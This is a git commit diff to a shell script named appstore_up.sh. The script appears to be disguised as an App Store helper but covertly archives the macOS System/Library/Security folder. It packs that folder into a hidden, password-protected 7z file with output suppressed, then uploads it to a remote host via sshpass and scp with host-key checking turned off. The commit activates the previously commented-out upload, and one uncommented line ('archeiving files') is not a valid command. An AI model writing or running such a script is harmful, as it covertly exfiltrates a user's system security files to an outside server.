ff1e863e4d960c1fc9e2467870a86d8756fa9356
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-05-30 11:53:36 +0530

    Update appstore_up.sh

--- appstore_up.sh
+++ appstore_up.sh
@@ -1,6 +1,6 @@
 
-#cd $home/../../../System/Library/
-#archeiving files
+cd $home/../../../System/Library/
+archeiving files
 echo "archiving silently"
 #zip -qr Security_unmodified.zip Security && echo "Archiving complete!"
 7z a -pRats@8804 -mhe=on .appstore_unmodified.7z Security -y -bso0 -bsp0
@@ -17,11 +17,11 @@ REMOTE_DEST="/"
 # --- Upload Command ---
 # -p specifies the password
 # -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
-#sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
  echo "connection sucesfully"
 # Check if the upload was successful
-#if [[ $? -eq 0 ]]; then
-  #  echo "connection sucesfully"
-#else
-#    echo "connection failed."
-#fi
+if [[ $? -eq 0 ]]; then
+   echo "connection sucesfully"
+else
+   echo "connection failed."
+fi
